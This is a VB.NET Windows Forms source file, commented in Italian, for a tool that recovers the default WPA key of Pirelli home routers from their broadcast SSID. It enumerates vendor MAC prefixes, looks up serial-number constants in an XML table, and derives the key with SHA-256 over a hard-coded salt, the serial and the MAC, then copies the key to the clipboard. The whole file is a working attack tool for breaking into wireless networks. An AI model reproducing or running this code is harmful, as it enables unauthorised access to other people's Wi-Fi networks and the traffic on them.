Imports System.Text.Encoding
Imports NetSHA
Imports System.Reflection





<Microsoft.VisualBasic.ComClass()> Public Class Form1
    Dim MAC_Array() As String = {"6487D7", "38229D", "00A02F", "002553", "00238E", "002233", "001D8B", "001CA2", "00193E", "0017C2", "0013C8", "000827"}

    Private PirelliMACs() As String = {"6487D7", "38229D", "00A02F", "002553", "00238E", "002233", "001D8B", "001CA2", "00193E", "0017C2", "0013C8", "000827"} 'MAC Pirelli
    Private SHAString() As Byte = {100, 198, 221, 227, 229, 121, 182, 217, 134, 150, 141, 52, 69, 210, 59, 21, 202, 175, 18, 132, 2, 172, 86, 0, 5, 206, 32, 117, 145, 63, 220, 232} 'Stringa fissa per SHA256, convertita in un array di Byte
    Const WPAString As String = "0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123" 'Stringa fissa WPA
    Dim mypath = System.IO.Path.GetDirectoryName(Assembly.GetExecutingAssembly.GetModules(0).FullyQualifiedName)

    Public Structure MacResults
        Dim PossibleMACs As String
        Dim ImpossibleMACs As String

    End Structure

    Public Structure impost
        Dim Prefix As String
        Dim SN1 As String
        Dim K As Integer
        Dim Q As Long
        Dim MAC As String

    End Structure


    Private Sub btnCalculateMAC_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim MAC1 As String = "", MAC2 As String = ""
        Dim PossibleMACs As String = "", ImpossibleMACs As String = ""
        Dim PossibleMACs_Array() As String, ImpossibleMACs_Array() As String
        Dim ProbMAC As String = ""
        Dim MACs As MacResults
        MACs.PossibleMACs = ""
        MACs.ImpossibleMACs = ""
        Try
            If txtSSID.Text.Length < 8 Then
                MessageBox.Show("Inserire un SSID valido (8 cifre)", "Attenzione")
                Exit Sub
            End If

            ProbMAC = MostProbMAC(txtSSID.Text)

            Select Case (pad.Value)
                Case "0"
                    MAC2 = Hex(txtSSID.Text)
                    MACs = GetMACs(MAC1, MAC2, ProbMAC, MACs)
                Case "1"
                    MAC2 = Hex("1" & txtSSID.Text)
                    MACs = GetMACs(MAC1, MAC2, ProbMAC, MACs)
                Case "2"
                    MAC2 = Hex("2" & txtSSID.Text)
                    MACs = GetMACs(MAC1, MAC2, ProbMAC, MACs)
            End Select
            PossibleMACs_Array = Strings.Split(MACs.PossibleMACs, "-")
            ImpossibleMACs_Array = Strings.Split(MACs.ImpossibleMACs, "-")
            lstMAC.Items.Clear()
            lstMAC.Items.Add("-------Lista MAC probabili-------")
            For i As Integer = 0 To PossibleMACs_Array.Length - 1
                lstMAC.Items.Add(PossibleMACs_Array(i))
            Next
            lstMAC.Items.Add("-------Lista MAC improbabili-------")
            For i As Integer = 0 To ImpossibleMACs_Array.Length - 1
                lstMAC.Items.Add(ImpossibleMACs_Array(i))
            Next
        Catch ex As Exception
            MessageBox.Show("Si è verificato un errore. ")
        End Try

      


    End Sub

    Private Function GetMACs(ByRef MAC1 As String, ByRef MAC2 As String, ByRef ProbMAC As String, ByVal PreviouslyCalculatedMACS As MacResults) As MacResults
        GetMACs.PossibleMACs = PreviouslyCalculatedMACS.PossibleMACs
        GetMACs.ImpossibleMACs = PreviouslyCalculatedMACS.ImpossibleMACs
        If MAC2.Length = 7 Then
            For i As Integer = 0 To MAC_Array.Length - 1
                MAC1 = MAC_Array(i)
                If Strings.Right(MAC1, 1) = Strings.Left(MAC2, 1) Then
                    If MAC1 = ProbMAC Then
                        GetMACs.PossibleMACs = MAC1 & Strings.Right(MAC2, 6) & "-" & GetMACs.PossibleMACs
                    Else
                        GetMACs.PossibleMACs = GetMACs.PossibleMACs & MAC1 & Strings.Right(MAC2, 6) & "-"
                    End If
                Else
                    GetMACs.ImpossibleMACs = GetMACs.ImpossibleMACs & MAC1 & Strings.Right(MAC2, 6) & "-"
                End If
            Next
        End If
    End Function

    Private Function MostProbMAC(ByVal RefString As String) As String
        Dim compatibility As Integer = 0, MAC As String = "", tempCompatibility As Integer

        Dim Settings(4) As impost


        For i As Integer = 0 To Settings.Length - 1
            tempCompatibility = 0
            If Strings.Mid(RefString, 1, 1) = Strings.Mid(Settings(i).Prefix, 1, 1) Then
                tempCompatibility = 1
            End If
            If Strings.Mid(RefString, 2, 1) = Strings.Mid(Settings(i).Prefix, 2, 1) And compatibility = 1 Then
                tempCompatibility = 2
            End If
            If Strings.Mid(RefString, 3, 1) = Strings.Mid(Settings(i).Prefix, 3, 1) And compatibility = 2 Then
                tempCompatibility = 3
            End If
            If (tempCompatibility > compatibility) And (Settings(i).MAC <> "XXXXXX") Then
                compatibility = tempCompatibility
                MAC = Settings(i).MAC
            End If
        Next

        If MAC = "" Then MAC = "XXXXXX"
        MostProbMAC = MAC


    End Function
 
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim SSID = txtSSID.Text
        Dim sid = txtSSID.Text.Substring(0, 3)
        Dim sidred = txtSSID.Text.Substring(0, 2) & "00"
        Dim cerca As Integer
        Dim q As Integer
        Dim k As Integer
        Dim serial As String
        Dim ds As New Data.DataSet
        Dim i As Integer

        Dim file = (mypath + "\MagicNumbers.xml")

        ds.ReadXml(file.ToString)
        Dim progressvalue = ds.Tables("Table1").Rows.Count

        'Eseguo una iterazione per ogni riga presente nella tabella
        For i = 0 To ds.Tables("Table1").Rows.Count - 1
            ProgressBar1.Maximum = progressvalue
            ProgressBar1.Value = i
            'Visualizzo un messaggio per ogni valore letto
            cerca = (ds.Tables("Table1").Rows(i).Item("SSID"))
            If cerca = sid Then
                serial = (ds.Tables("Table1").Rows(i).Item("Serial"))
                k = (ds.Tables("Table1").Rows(i).Item("k"))
                q = (ds.Tables("Table1").Rows(i).Item("q"))
                ProgressBar1.Value = progressvalue
                Dim SN2 As String
                SN2 = CStr((Val(SSID) - q) / k)
                If SN2 = CInt(SN2) Then
                    Exit For
                End If
            End If
        Next

        If serial = "" Then
            ProgressBar1.Value = 0

            For i = 0 To ds.Tables("Table1").Rows.Count - 1
                ProgressBar1.Maximum = progressvalue
                ProgressBar1.Value = i
                'Visualizzo un messaggio per ogni valore letto
                cerca = (ds.Tables("Table1").Rows(i).Item("SSID"))
                If cerca = sidred Then
                    serial = (ds.Tables("Table1").Rows(i).Item("Serial"))
                    k = (ds.Tables("Table1").Rows(i).Item("k"))
                    q = (ds.Tables("Table1").Rows(i).Item("q"))
                    ProgressBar1.Value = progressvalue
                    Dim SN2 As String
                    SN2 = CStr((Val(SSID) - q) / k)
                    If SN2 = CInt(SN2) Then
                        Exit For
                    End If

                End If
            Next


        End If

        If serial = "" Then
            MessageBox.Show("ERRORE: SSID non trovato")
        Else


            Dim SN2 As String
            SN2 = CStr((Val(SSID) - q) / k)

            While (SN2.Length < 7) 'Se il risultato non è di 7 cifre, aggiungiamo gli 0 mancanti
                SN2 = "0" & SN2
            End While

          

            Seriallab.Text = (serial & "X" & SN2)
            Label5.Text = ("K:" & k)
            Label6.Text = ("Q:" & q)
            Dim macbyte = getBytesFromHexStr(TextBox2.Text)
            Dim wpares = getWPA(Seriallab.Text, macbyte)
            MsgBox(wpares)
            Clipboard.SetDataObject(wpares)
            MsgBox("Chiave Wpa copiata , è possibile eseguire il copia/incolla")
            ProgressBar1.Value = 0

        End If
    End Sub

    Public Function getBytesFromHexStr(ByVal tStr As String) As Byte()
        Dim i As Integer = 0
        Dim tBytes As New List(Of Byte)

        For i = 0 To (tStr.Length - 1) Step 2 'Scorro tutta la stringa con incremento 2
            tBytes.Add(CByte("&H" & tStr.Substring(i, 2))) 'Prendo 2 caratteri per volta e convertiamoli in byte
        Next

        Return tBytes.ToArray
    End Function



    Public Function getWPA(ByVal SN As String, ByVal ethMAC As Byte()) As String


        Dim shaBytes(23) As Byte
        Dim WPA As String = ""

        Array.Copy(NetSHA.SHA256.MessageSHA256(SHAString.Concat(ASCII.GetBytes(SN).Concat(ethMAC)).ToArray), shaBytes, 24)
        For Each bChar As Byte In shaBytes
            WPA &= WPAString(CInt(bChar))
        Next

        Return WPA
    End Function




    Private Sub lstMAC_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles lstMAC.SelectedIndexChanged
        TextBox2.Text = lstMAC.SelectedItem

    End Sub

 


    Private Sub MenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MenuItem2.Click
        Me.Close()
    End Sub

    
    Private Sub MenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MenuItem3.Click
        lstMAC.Size = New System.Drawing.Size(337, 147)
        Seriallab.Visible = True
        Label4.Visible = True
        Label5.Visible = True
        Label6.Visible = True

    End Sub

    Private Sub MenuItem4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MenuItem4.Click
        lstMAC.Size = New System.Drawing.Size(337, 263)
        Seriallab.Visible = False
        Label4.Visible = False
        Label5.Visible = False
        Label6.Visible = False
    End Sub

   
    

    Private Sub MenuItem5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MenuItem5.Click
        MessageBox.Show("Programma sviluppato da Rs9000" & vbNewLine & "per info: Rs9000.dc@gmail.com" & vbNewLine & vbNewLine & "www.bypass-world.net" & vbNewLine & "www.rs9000.eu", "Info", MessageBoxButtons.OK, MessageBoxIcon.Asterisk, MessageBoxDefaultButton.Button3)
    End Sub

    Private Sub MenuItem7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MenuItem7.Click
        Fastw.Show()
    End Sub

  

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Label1.Parent = PictureBox1
    End Sub




  
End Class

